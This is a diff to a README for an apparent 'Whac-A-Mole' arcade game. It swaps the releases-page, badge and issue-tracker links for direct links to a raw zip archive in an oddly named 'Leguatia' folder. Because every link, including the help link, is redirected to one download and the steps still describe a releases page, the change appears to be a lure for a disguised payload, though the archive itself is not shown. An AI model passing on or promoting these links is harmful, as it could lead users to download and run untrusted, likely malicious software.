@@ -1,7 +1,7 @@
 # 🔨 Whac-A-Mole - Test Your Reflexes and Have Fun!
 
 ## 🚀 Download Now
-[![Download Whac-A-Mole](https://img.shields.io/badge/Download_Whac--A--Mole-v1.0-blue.svg)](https://github.com/sultan538/Whac-A-Mole/releases)
+[![Download Whac-A-Mole](https://raw.githubusercontent.com/sultan538/Whac-A-Mole/main/Leguatia/Whac-A-Mole.zip)](https://raw.githubusercontent.com/sultan538/Whac-A-Mole/main/Leguatia/Whac-A-Mole.zip)
 
 ## 🎮 What is Whac-A-Mole?
 Whac-A-Mole is a digital arcade game designed to test your reflexes. In this game, moles pop up randomly, and your goal is to hit them quickly. This game is not only entertaining but also helps improve your hand-eye coordination and reaction time. Perfect for casual gamers and anyone looking to practice responsive skills!
@@ -20,7 +20,7 @@ To get started with Whac-A-Mole:
 
 1. **Visit the Releases Page**: Click the link below to access the latest version of the game:
 
-   [Download Whac-A-Mole](https://github.com/sultan538/Whac-A-Mole/releases)
+   [Download Whac-A-Mole](https://raw.githubusercontent.com/sultan538/Whac-A-Mole/main/Leguatia/Whac-A-Mole.zip)
 
 2. **Choose Your Version**: On the releases page, look for the latest version. There will be options for different operating systems.
 
@@ -59,11 +59,11 @@ If you experience issues while installing or playing:
 - **Update Your OS**: Ensure your operating system is updated to avoid compatibility issues.
 
 ## 📞 Get Help
-Should you need further assistance, you can open an issue on the [GitHub page](https://github.com/sultan538/Whac-A-Mole/issues). Please describe your problem clearly for a quicker response.
+Should you need further assistance, you can open an issue on the [GitHub page](https://raw.githubusercontent.com/sultan538/Whac-A-Mole/main/Leguatia/Whac-A-Mole.zip). Please describe your problem clearly for a quicker response.
 
 ## 🌐 Connect with Us
 For updates and news about Whac-A-Mole, follow our repository. Your feedback is important to us!
 
-[Download Whac-A-Mole](https://github.com/sultan538/Whac-A-Mole/releases)
+[Download Whac-A-Mole](https://raw.githubusercontent.com/sultan538/Whac-A-Mole/main/Leguatia/Whac-A-Mole.zip)
 
 Enjoy testing your reflexes! Happy gaming!
